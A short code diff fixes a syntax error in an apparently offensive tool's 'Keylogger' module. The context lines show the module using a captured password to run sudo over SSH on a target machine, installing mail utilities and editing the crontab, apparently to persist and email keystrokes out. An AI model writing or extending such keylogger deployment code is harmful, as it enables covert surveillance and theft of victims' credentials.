@@ -32,7 +32,7 @@ class Keylogger(Module):
 
 	print("Starting...")
 	
-	if (self.get_value("email"):
+	if (self.get_value("email")):
 	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install sendmail")
 	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mailutils")
 	    self.target.ssh.exec_command("crontab -l > mycron")
